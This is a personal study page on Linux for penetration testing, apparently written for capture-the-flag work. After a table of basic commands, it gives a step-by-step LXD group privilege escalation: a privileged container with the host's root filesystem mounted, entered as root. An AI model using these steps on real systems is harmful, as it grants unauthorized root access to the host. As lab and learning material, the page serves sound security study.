# Linux

I wanted to list some concepts, terms and flows that are specific to Linux. Learning more about Linux has made me a better and more effcient pentration tester.

## Basic Commands

There are some commands that I use all the time. I have put together a list of the most common commands I use while doing a capture the flag event. All the commands have optional flags that can enhance what the commands do. When I need help with a command I run `man <command>` to get a more detailed description of each command. Here are the most common commands that I use:

| Command | Purpose |
| ------------- | -------------- |
| ls | Lists files and directories in the current location. |
| cd | Changes the current directory. |
| pwd | Prints the current working directory. |
| mkdir | Creates a new directory. |
| rm | Removes files or directories. |
| cp | Copies files or directories. |
| mv | Moves or renames files and directories. |
| touch | Creates an empty file or updates timestamps. |
| cat | Displays file contents. |
| nano or vim | Opens a text editor, nano is more beginner friendly. |
| chmod | Changes file permissions. |
| chown | Changes file ownership. |
| find | Searches for files and directories. |
| grep | Searches text using patterns (regex). |
| ps aux | Lists all running processes. |
| kill | Terminates processes by PID or name. |

## LXD (pronounced lex-dee)

LXD is used to manage virtual machines and system containers. It has very minimal overhead. I have used both Docker and Podman in the past and it works very similar to both.

I can create or download an image, start multiple containers from that single image and have them interact with each other.

The lxc command is used to start and stop containers. To use the lxd and lxc binaries my user was in the lxd group. The example below will allow a user that is in the lxd group but not root to do a privilege escalation to root. The neat part is that the user will be root in the container and the host will map the actions of the root user in the container to the root user on the host.

Below is an example of how to download an alpine image from github and then run the container. Some of the file names may have changed but the concept should be the same.

Step 1 - Download the image from github.

```bash
$ git clone https://github.com/saghul/lxd-alpine-builder.git
```

Step 2 - Import the image and alias it as alpine.

```bash
$ cd lxd-alpine-builder
$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
```

I normally check if it imported by running the following:

```bash
$ lxc image list
```

Step 3 - Create a container from the image named kwmd.

```bash
$ lxc init alpine kwmd -c security.privileged=true
```

The security.privileged=true configuration option maps the container uid 0 to the host's uid 0. In other words, the container's user is root and will run as root on the host machine.

Step 4 - Map the host hard drive to the container hard drive, I alias the drive as mydrive in this example.

```bash
$ lxc config device add kwmd mydrive disk source=/ path=/mnt/root recursive=true
```

This mounts the / directory on the host to the /mnt/root directory in the container. This combined with the security.privileged=true in step 3 is very dangerous.

Step 5 - Start the container.

```bash
$ lxc start kwmd
```

Step 6 - Enter the container with a shell.

```bash
$ lxc exec kwmd /bin/sh
```

The cursor will show up as a # character to let me know I am root.

I can now modify view or modify any file on the host directory. I just need to remember to prepend any directory with /mnt/root. Here are some examples:

- The /etc directory on the host would be /mnt/root/etc from the container.
- The /home directory on the host would be /mnt/root/home from the container.
- The /root directory on the host would be /mnt/root/root from the container.

Since I am root in the container and security.privileged=true was set, the host operating system maps any of my root container actions to the root user on the host machine.
